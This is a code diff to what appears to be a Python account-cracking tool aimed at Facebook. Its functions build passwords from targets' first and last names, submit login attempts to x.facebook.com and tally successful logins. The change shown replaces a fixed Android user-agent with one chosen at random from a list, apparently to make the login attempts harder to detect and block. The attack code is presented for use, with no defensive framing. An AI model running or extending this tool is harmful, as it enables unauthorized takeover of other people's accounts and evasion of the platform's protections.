@@ -284,7 +284,7 @@ def mmm(ids,names,passlist):
 		ps2 = last.lower()
 		for fikr in passlist:
 			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua = "Dalvik/2.1.0 (Linux; U; Android 13; SM-S908U Build/TP1A.220624.014)"
+			ua = random.choice(ugen)
 			
 			session.headers.update({"Host":"x.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
 			getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
@@ -326,7 +326,7 @@ def ffb(ids,names,passlist):
 		ps2 = last.lower()
 		for fikr in passlist:
 			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua = "Dalvik/2.1.0 (Linux; U; Android 13; SM-S908U Build/TP1A.220624.014)"
+			ua = random.choice(ugen)
 			
 			head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 			getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
@@ -516,7 +516,7 @@ def fcrack(uid,pwx,tl):
 			session = requests.Session()
 			sys.stdout.write(f'\r [\033[0;92mMUZZI\033[0;92m] %s|OK:-%s \r'%(loop,len(oks))),
 			sys.stdout.flush()
-			ua = "Dalvik/2.1.0 (Linux; U; Android 13; SM-S908U Build/TP1A.220624.014)"
+			ua = random.choice(ugen)
 			free_fb = session.get('https://x.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
